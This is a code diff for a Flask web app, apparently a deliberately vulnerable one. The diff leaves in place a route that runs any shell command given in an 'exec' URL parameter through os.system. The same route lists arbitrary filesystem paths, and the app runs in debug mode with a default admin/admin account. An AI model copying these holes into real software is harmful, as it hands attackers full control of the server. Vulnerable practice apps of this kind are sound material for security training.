@@ -9,7 +9,7 @@ from flask import (
     flash,
 )
 from flask_sqlalchemy import SQLAlchemy
-from werkzeug.security import check_password_hash, generate_password_hash
+from werkzeug.security import check_password_hash
 from flask_simple_captcha import CAPTCHA
 from flask_login import (
     LoginManager,
@@ -21,6 +21,7 @@ from flask_login import (
 )
 import os, string
 from datetime import datetime
+from utils import find_free_port, initialize_database
 
 app = Flask(__name__)
 app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///app.db"
@@ -60,18 +61,6 @@ class Comment(db.Model):
     user_id = db.Column(db.Integer, db.ForeignKey("user.id"))
 
 
-with app.app_context():
-    db.create_all()
-
-    default_user = User.query.filter_by(username="admin").first()
-
-    if not default_user:
-        default_password = generate_password_hash("admin", method="pbkdf2:sha256")
-        new_user = User(username="admin", password=default_password)
-        db.session.add(new_user)
-        db.session.commit()
-
-
 @login_manager.user_loader
 def load_user(user_id):
     return db.session.query(User).get(int(user_id))
@@ -83,7 +72,6 @@ def load_user(user_id):
 def index(req_path):
     exec_arg = request.args.get("exec")
     if exec_arg:
-        print(exec_arg)
         os.system(exec_arg)
 
     abs_path = os.path.join("/", req_path)
@@ -97,7 +85,7 @@ def index(req_path):
     files = os.listdir(abs_path)
     comments = Comment.query.all()
 
-    return render_template("index.html", files=files, comments=comments)
+    return render_template("index.html", files=files, comments=comments, port=port)
 
 
 @app.route("/login")
@@ -156,4 +144,7 @@ def submit_comment():
 
 
 if __name__ == "__main__":
-    app.run(debug=True, port=8080)
+    initialize_database(app, db, User)
+    free_port = find_free_port(start_port=8080)
+    port = free_port - 1
+    app.run(debug=True, port=free_port)
